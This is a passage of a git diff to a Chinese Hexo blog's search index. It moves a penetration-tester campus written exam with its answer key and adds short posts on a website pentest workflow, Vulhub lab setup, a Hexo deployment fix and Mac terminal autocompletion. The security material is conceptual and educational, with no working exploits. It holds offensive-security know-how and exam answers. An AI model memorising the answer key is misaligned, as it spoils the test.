-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"># 启动docker</span><br><span class="line">systemctl start docker </span><br><span class="line"># 查看docker状态</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
-
-<p>接下来安装docker-compose并查看其版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip </span><br><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
-
-<p>下载vulhub：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
-
-<p>进入到vulhub下对应目录启动docker即可成功搭建靶场，启动后运行在浏览器<code>http://your-ip:8080</code>中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编译并运行漏洞环境</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 关闭靶场</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
-
-<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Docker</tag>
-        <tag>Vulhub</tag>
-      </tags>
   </entry>
   <entry>
     <title>侧信道攻击技术简介</title>
@@ -1735,89 +1636,6 @@ $ hexo d # == hexo deploy 上传
       </categories>
       <tags>
         <tag>侧信道</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>卫士通 笔试题目</title>
-    <url>/2022/09/16/%E5%8D%AB%E5%A3%AB%E9%80%9A-%E7%AC%94%E8%AF%95%E9%A2%98%E7%9B%AE/</url>
-    <content><![CDATA[<h3 id="卫士通-渗透测试工程师-校招笔试"><a href="#卫士通-渗透测试工程师-校招笔试" class="headerlink" title="卫士通 渗透测试工程师 校招笔试"></a>卫士通 渗透测试工程师 校招笔试</h3><h4 id="单选"><a href="#单选" class="headerlink" title="单选"></a>单选</h4><ol>
-<li><p>攻击者通过XSS漏洞获取到QQ用户的cookie后，可以进行一下哪一步操作？    D<br> A. 劫持微信用户<br> B. 偷取Q币<br> C. 控制用户摄像头<br> D. 进入QQ空间</p>
-</li>
-<li><p>Firefox浏览器插件HackBar提供的功能没有什么    C<br> A. 修改浏览器访问referer<br> B. BASE64编码和解码<br> C. 代理修改WEB页面的内容<br> D. POST方式提交数据</p>
-</li>
-<li><p>以下哪个服务器未曾被发现文件解析漏洞    B<br> A. nginx<br> B. squid<br> C. Apache<br> D. IIS</p>
-</li>
-<li><p>哈希函数的输入长度是    C<br> A. 128bit<br> B. 160bit<br> C. 任意长度<br> D. 512bit</p>
-</li>
-<li><p>假如你向一台远程主机发送特定的数据包，却不想远程主机响应你的数据包，这时应该选择的攻击手段是    C<br> A. 缓冲区溢出<br> B. 暴力攻击<br> C. 地址欺骗<br> D. 拒绝服务</p>
-</li>
-<li><p>没有权限访问网页时，服务器返回什么状态码    D<br> A. 401<br> B. 200<br> C. 500<br> D. 403</p>
-</li>
-<li><p>下列哪类工具是日常被用来扫描 Web 漏洞的工具    C<br> A. Nmap<br> B. Nessus<br> C. IBM APPSCAN<br> D. X-SCAN</p>
-</li>
-<li><p>Apache默认解析后缀不包括    A<br> A. pht<br> B. php3<br> C. php5<br> D. phtml</p>
-</li>
-<li><p>高层的协议将数据传递到网络层后，形成（），而后传送到数据链路层    A<br> A. 数据包<br> B. 数据帧<br> C. 数据段<br> D. 信元</p>
-</li>
-<li><p>之前版本的中间件未出现过解析漏洞的是    A<br>A. Tomcat<br>B. Apache<br>C. IIS<br>D. ngnix</p>
-</li>
-<li><p>编写目录扫描工具时使用哪种请求方式可以增加扫描速度    C<br>A. GET<br>B. PUT<br>C. HEAD<br>D. POST</p>
-</li>
-<li><p>Oracle默认情况下口令的传输方式是    A<br>A. 明文传输<br>B. DES加密传输<br>C. 3DES加密传输<br>D. RSA加密传输</p>
-</li>
-<li><p>一个网站存在命令执行漏洞，由于服务器不能连外网，这时可以利用什么样的方式将文件上传到服务器    D<br>A. vbs<br>B. powershell<br>C. echo<br>D. FTP</p>
-</li>
-<li><p>TCP会话劫持除了SYN FLOOD攻击还需要    B<br>A. SYN扫描<br>B. 序列号预测<br>C. TCP扫描<br>D. SYN/ACK扫描</p>
-</li>
-<li><p>htaccess文件作用描述错误的是    D<br>A. 禁止目录列表<br>B. 配置默认文档<br>C. 自定义404错误页面<br>D. 修改密码</p>
-</li>
-<li><p>常规端口扫描和半开式扫描的区别是    B<br>A. 没什么区别<br>B. 没有完成三次握手，缺少ACK过程<br>C. 半开式采用UDP方式扫描<br>D. 扫描准确性不一样</p>
-</li>
-<li><p>以下数据库只能通过字典枚举数据表的是    A<br>A. mysql &lt; 5.0<br>B. mysql &gt; 5.0<br>C. oracle<br>D. mssql</p>
-</li>
-<li><p>黑客通过哪种攻击方式可以大批量获取网站注册用户信息    D<br>A. XSS<br>B. CSRF<br>C. 越权<br>D. 以上都可以</p>
-</li>
-<li><p>当Web服务器访问人数超过上限时，页面返回什么状态码    B<br>A. 200<br>B. 503<br>C. 403<br>D. 302</p>
-</li>
-<li><p>防御文件包含漏洞的方法不包括    B<br>A. 禁止自定义文件名<br>B. 禁止上传文件<br>C. 禁止文件名中包含目录名<br>D. 限制文件名中包含字母与数字</p>
-</li>
-<li><p>下面哪个口令可以打印Linux所有进程信息    C<br>A. su<br>B. ls -l<br>C. ps -ef<br>D. ls –d</p>
-</li>
-<li><p>以下哪个不是关系型数据库    C<br>A. mysql<br>B. mssql<br>C. redis<br>D. Oracle</p>
-</li>
-<li><p>如果一个网站存在CSRF漏洞，可以通过CSRF漏洞做什么    D<br>A. 获取网站用户注册的个人资料信息<br>B. 修改网站用户注册的个人资料信息<br>C. 冒用网站用户的身份发布信息<br>D. 以上都可以</p>
-</li>
-<li><p>在web页面中增加验证码功能后，下面说法正确的是    C<br>A. 可以防止注入攻击<br>B. 可以防止文件上传漏洞<br>C. 可以防止数据重复提交正确答案<br>D. 可以防止文件包含漏洞</p>
-</li>
-<li><p>向有限的空间输入超长的字符串的攻击手段是    A<br>A. 缓冲区溢出<br>B. 网络监听<br>C. 拒绝服务<br>D. IP欺骗</p>
-</li>
-<li><p>攻击者截获了从A发向B的数据，然后又从早些时候所截获的数据中提取出部分信息重新发往B，这种攻击方法称为    D<br>A. 暴力破解<br>B. 中间人攻击<br>C. 拒绝服务攻击<br>D. 重放攻击</p>
-</li>
-<li><p>数据完整性指的是    C<br>A. 保护网络中各系统之间交换的数据，防止因数据被截获而造成泄密<br>B.提供连接实体身份的鉴别<br>C. 防止非法实体对用户的主动攻击，保证数据接受方收到的信息与发送方发送的信息一致<br>D.确保数据是由合法实体发出的 </p>
-</li>
-</ol>
-<h4 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h4><ol>
-<li>如何防止DLL劫持</li>
-</ol>
-<p>DLL劫持利用系统未知DLL的搜索路径方式，使得程序加载当前目录下的系统同名DLL。所以可以告诉系统DLL的位置，改变加载系统DLL的顺序不是当前目录，而是直接到系统目录下查找。<br>　　<br>　　这个想法可以通过修改注册表实现： </p>
-<ul>
-<li>  在注册表键值：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</li>
-<li>  是调用系统DLL的首要查找目录。例如里面有RE_SZ类型的”ntdll”=”ntdll.dll”项，则系统载入”ntdll”时会直接从系统目录加载。</li>
-<li>  由此，添加”LPK”=”LPK.DLL”即可防止LPK被劫持，同理可以阻止一些其他DLL被劫持，例如”USP10”。</li>
-</ul>
-<p>　　在Windows NT系统，XP默认只有少数关键DLL在此键值下，Win7下面此键值已经相当齐全，在Win7系统下发生DLL劫持的概率要比XP小很多。</p>
-<ol start="2">
-<li>哪些是动态网页</li>
-</ol>
-<p>凡是结合了HTML以外的如Java、VB、VC等高级程序设计语言和数据库技术进行的网页编程技术生成的网页都是动态网页，能与后台数据库进行交互，数据传递。</p>
-<p>通常以.aspx、.asp、.jsp、.php、.perl、.cgi 等形式为后缀，并且在动态网页网址中有一个标志性的符号——“?”。</p>
-]]></content>
-      <categories>
-        <category>笔试</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>测试</tag>
       </tags>
   </entry>
   <entry>
@@ -2504,6 +2322,89 @@ $ hexo d # == hexo deploy 上传
       </tags>
   </entry>
   <entry>
+    <title>卫士通 笔试题目</title>
+    <url>/2022/09/16/%E5%8D%AB%E5%A3%AB%E9%80%9A-%E7%AC%94%E8%AF%95%E9%A2%98%E7%9B%AE/</url>
+    <content><![CDATA[<h3 id="卫士通-渗透测试工程师-校招笔试"><a href="#卫士通-渗透测试工程师-校招笔试" class="headerlink" title="卫士通 渗透测试工程师 校招笔试"></a>卫士通 渗透测试工程师 校招笔试</h3><h4 id="单选"><a href="#单选" class="headerlink" title="单选"></a>单选</h4><ol>
+<li><p>攻击者通过XSS漏洞获取到QQ用户的cookie后，可以进行一下哪一步操作？    D<br> A. 劫持微信用户<br> B. 偷取Q币<br> C. 控制用户摄像头<br> D. 进入QQ空间</p>
+</li>
+<li><p>Firefox浏览器插件HackBar提供的功能没有什么    C<br> A. 修改浏览器访问referer<br> B. BASE64编码和解码<br> C. 代理修改WEB页面的内容<br> D. POST方式提交数据</p>
+</li>
+<li><p>以下哪个服务器未曾被发现文件解析漏洞    B<br> A. nginx<br> B. squid<br> C. Apache<br> D. IIS</p>
+</li>
+<li><p>哈希函数的输入长度是    C<br> A. 128bit<br> B. 160bit<br> C. 任意长度<br> D. 512bit</p>
+</li>
+<li><p>假如你向一台远程主机发送特定的数据包，却不想远程主机响应你的数据包，这时应该选择的攻击手段是    C<br> A. 缓冲区溢出<br> B. 暴力攻击<br> C. 地址欺骗<br> D. 拒绝服务</p>
+</li>
+<li><p>没有权限访问网页时，服务器返回什么状态码    D<br> A. 401<br> B. 200<br> C. 500<br> D. 403</p>
+</li>
+<li><p>下列哪类工具是日常被用来扫描 Web 漏洞的工具    C<br> A. Nmap<br> B. Nessus<br> C. IBM APPSCAN<br> D. X-SCAN</p>
+</li>
+<li><p>Apache默认解析后缀不包括    A<br> A. pht<br> B. php3<br> C. php5<br> D. phtml</p>
+</li>
+<li><p>高层的协议将数据传递到网络层后，形成（），而后传送到数据链路层    A<br> A. 数据包<br> B. 数据帧<br> C. 数据段<br> D. 信元</p>
+</li>
+<li><p>之前版本的中间件未出现过解析漏洞的是    A<br>A. Tomcat<br>B. Apache<br>C. IIS<br>D. ngnix</p>
+</li>
+<li><p>编写目录扫描工具时使用哪种请求方式可以增加扫描速度    C<br>A. GET<br>B. PUT<br>C. HEAD<br>D. POST</p>
+</li>
+<li><p>Oracle默认情况下口令的传输方式是    A<br>A. 明文传输<br>B. DES加密传输<br>C. 3DES加密传输<br>D. RSA加密传输</p>
+</li>
+<li><p>一个网站存在命令执行漏洞，由于服务器不能连外网，这时可以利用什么样的方式将文件上传到服务器    D<br>A. vbs<br>B. powershell<br>C. echo<br>D. FTP</p>
+</li>
+<li><p>TCP会话劫持除了SYN FLOOD攻击还需要    B<br>A. SYN扫描<br>B. 序列号预测<br>C. TCP扫描<br>D. SYN/ACK扫描</p>
+</li>
+<li><p>htaccess文件作用描述错误的是    D<br>A. 禁止目录列表<br>B. 配置默认文档<br>C. 自定义404错误页面<br>D. 修改密码</p>
+</li>
+<li><p>常规端口扫描和半开式扫描的区别是    B<br>A. 没什么区别<br>B. 没有完成三次握手，缺少ACK过程<br>C. 半开式采用UDP方式扫描<br>D. 扫描准确性不一样</p>
+</li>
+<li><p>以下数据库只能通过字典枚举数据表的是    A<br>A. mysql &lt; 5.0<br>B. mysql &gt; 5.0<br>C. oracle<br>D. mssql</p>
+</li>
+<li><p>黑客通过哪种攻击方式可以大批量获取网站注册用户信息    D<br>A. XSS<br>B. CSRF<br>C. 越权<br>D. 以上都可以</p>
+</li>
+<li><p>当Web服务器访问人数超过上限时，页面返回什么状态码    B<br>A. 200<br>B. 503<br>C. 403<br>D. 302</p>
+</li>
+<li><p>防御文件包含漏洞的方法不包括    B<br>A. 禁止自定义文件名<br>B. 禁止上传文件<br>C. 禁止文件名中包含目录名<br>D. 限制文件名中包含字母与数字</p>
+</li>
+<li><p>下面哪个口令可以打印Linux所有进程信息    C<br>A. su<br>B. ls -l<br>C. ps -ef<br>D. ls –d</p>
+</li>
+<li><p>以下哪个不是关系型数据库    C<br>A. mysql<br>B. mssql<br>C. redis<br>D. Oracle</p>
+</li>
+<li><p>如果一个网站存在CSRF漏洞，可以通过CSRF漏洞做什么    D<br>A. 获取网站用户注册的个人资料信息<br>B. 修改网站用户注册的个人资料信息<br>C. 冒用网站用户的身份发布信息<br>D. 以上都可以</p>
+</li>
+<li><p>在web页面中增加验证码功能后，下面说法正确的是    C<br>A. 可以防止注入攻击<br>B. 可以防止文件上传漏洞<br>C. 可以防止数据重复提交正确答案<br>D. 可以防止文件包含漏洞</p>
+</li>
+<li><p>向有限的空间输入超长的字符串的攻击手段是    A<br>A. 缓冲区溢出<br>B. 网络监听<br>C. 拒绝服务<br>D. IP欺骗</p>
+</li>
+<li><p>攻击者截获了从A发向B的数据，然后又从早些时候所截获的数据中提取出部分信息重新发往B，这种攻击方法称为    D<br>A. 暴力破解<br>B. 中间人攻击<br>C. 拒绝服务攻击<br>D. 重放攻击</p>
+</li>
+<li><p>数据完整性指的是    C<br>A. 保护网络中各系统之间交换的数据，防止因数据被截获而造成泄密<br>B.提供连接实体身份的鉴别<br>C. 防止非法实体对用户的主动攻击，保证数据接受方收到的信息与发送方发送的信息一致<br>D.确保数据是由合法实体发出的 </p>
+</li>
+</ol>
+<h4 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h4><ol>
+<li>如何防止DLL劫持</li>
+</ol>
+<p>DLL劫持利用系统未知DLL的搜索路径方式，使得程序加载当前目录下的系统同名DLL。所以可以告诉系统DLL的位置，改变加载系统DLL的顺序不是当前目录，而是直接到系统目录下查找。<br>　　<br>　　这个想法可以通过修改注册表实现： </p>
+<ul>
+<li>  在注册表键值：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</li>
+<li>  是调用系统DLL的首要查找目录。例如里面有RE_SZ类型的”ntdll”=”ntdll.dll”项，则系统载入”ntdll”时会直接从系统目录加载。</li>
+<li>  由此，添加”LPK”=”LPK.DLL”即可防止LPK被劫持，同理可以阻止一些其他DLL被劫持，例如”USP10”。</li>
+</ul>
+<p>　　在Windows NT系统，XP默认只有少数关键DLL在此键值下，Win7下面此键值已经相当齐全，在Win7系统下发生DLL劫持的概率要比XP小很多。</p>
+<ol start="2">
+<li>哪些是动态网页</li>
+</ol>
+<p>凡是结合了HTML以外的如Java、VB、VC等高级程序设计语言和数据库技术进行的网页编程技术生成的网页都是动态网页，能与后台数据库进行交互，数据传递。</p>
+<p>通常以.aspx、.asp、.jsp、.php、.perl、.cgi 等形式为后缀，并且在动态网页网址中有一个标志性的符号——“?”。</p>
+]]></content>
+      <categories>
+        <category>笔试</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>字节跳动 笔试题目</title>
     <url>/2022/09/19/%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8-%E7%AC%94%E8%AF%95%E9%A2%98%E7%9B%AE/</url>
     <content><![CDATA[<h3 id="单选"><a href="#单选" class="headerlink" title="单选"></a>单选</h3><ol>
@@ -2612,6 +2513,105 @@ $ hexo d # == hexo deploy 上传
       <tags>
         <tag>测试</tag>
         <tag>开发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网站渗透测试流程</title>
+    <url>/2022/07/04/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
+    <content><![CDATA[<span id="more"></span>
+
+
+<h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><ol>
+<li>确定范围：测试目标的范围，IP、域名、内外网</li>
+<li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等</li>
+<li>确定需求：web应用的漏洞（新上线程序）？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等</li>
+<li>根据需求和技术能力来确定自己能不能做，能做多少</li>
+</ol>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol>
+<li>方式：主动扫描、开放搜索等</li>
+<li>开放搜索：利用搜索引擎获得、后台、未授权页面、敏感URL等</li>
+<li>基础信息：IP、网段、域名、端口</li>
+<li>系统信息：操作系统版本</li>
+<li>应用信息：各端口的应用，例如web应用、邮件应用等</li>
+<li>版本信息：所有这些探测到的东西的版本</li>
+<li>服务信息</li>
+<li>人员信息：域名注册人员信息、web应用中网站发帖ID、管理员姓名等</li>
+<li>防护信息：试着看能否探测到防护设备</li>
+</ol>
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>利用上一步列出的各种系统和应用等相应的漏洞</p>
+<ol>
+<li>方法：<ul>
+<li>漏扫、AWVS、IBM appscan等</li>
+<li>结合漏洞去exploit-db等位置找利用</li>
+<li>网上寻找验证poc</li>
+</ul>
+</li>
+<li>内容：<ul>
+<li>系统漏洞：系统没有及时打补丁</li>
+<li>Webserver漏洞：Webserver配置问题</li>
+<li>Web应用漏洞：Web应用开发问题</li>
+<li>其他端口服务漏洞：各种21/8080(st2)/7001/22/3389</li>
+<li>通信安全：明文传输、token在cookie中传输等</li>
+</ul>
+</li>
+</ol>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>将上一步发现的有可能可以成功利用的全部漏洞都验证一边，结合实际情况搭建模拟环境试验，成功后再应用于目标中</p>
+<ul>
+<li>自动化验证：结合自动化扫描工具提供的结果</li>
+<li>手工验证：根据公开资源进行验证</li>
+<li>试验验证：自己搭建模拟环境进行验证</li>
+<li>登陆猜解：有时可以尝试猜测破解一下登录的账号密码等信息</li>
+<li>业务漏洞验证：如发现业务漏洞要进行验证</li>
+</ul>
+<h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><ol>
+<li>按需整理：按照之前第一步跟客户确定好的范围、需求来整理资料，并将其形成报告</li>
+<li>补充介绍：对漏洞成因、验证过程和带来危害进行分析</li>
+<li>修补建议：对所有产生的问题提出合理高效安全的解决办法</li>
+</ol>
+<hr>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.bilibili.com/video/BV1kT411576m?p=9&share_source=copy_web">哔哩哔哩网站渗透测试流程教程</a></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决Hexo部署Github时页面显示问题</title>
+    <url>/2022/08/12/%E8%A7%A3%E5%86%B3Hexo%E9%83%A8%E7%BD%B2Github%E6%97%B6%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>检查 <code>_config.yml</code> 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:xinkjung  # 仓库地址</span><br><span class="line">  branch: master  # hexo </span><br></pre></td></tr></table></figure>
+
+<p>发现不知道什么时候改为了 <code>hexo</code> ，文件都上传到 <code>hexo</code> 目录下去了，修改为 <code>master</code> 即可。</p>
+<p>然后执行命令 <code>hexo clean</code>、<code>hexo d -g</code>尝试，这样就成功解决了。</p>
+]]></content>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>Blog</tag>
+        <tag>Github</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>配置MAC终端自动补全命令行</title>
+    <url>/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
+    <content><![CDATA[<ol>
+<li>打开终端，在命令行输入 <code>nano .inputrc</code> 然后回车运行会进入一个编辑页面</li>
+<li>将下列语句输入到文件中：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set completion-ignore-case on</span><br><span class="line">set show-all-if-ambiguous on</span><br><span class="line">TAB: menu-complete</span><br></pre></td></tr></table></figure>
+<img src="/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/1.inputrc.png" alt=".inputrc"></li>
+<li>输入完成之后 <code>Control + O</code> 保存文件然后按回车，之后 <code>Control + X</code> 退出编辑页面，然后重启终端就可以了（可以再次执行步骤1检查是否正确输入）<br><img src="/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/2.success.png" alt="success"></li>
+</ol>
+<hr>
+<p><strong>参考链接</strong></p>
+<p><a href="https://blog.csdn.net/qq_41134710/article/details/118573124">如何配置MAC的终端自动补全命令行</a></p>
+]]></content>
+      <categories>
+        <category>配置</category>
+      </categories>
+      <tags>
+        <tag>Mac</tag>
       </tags>
   </entry>
 </search>
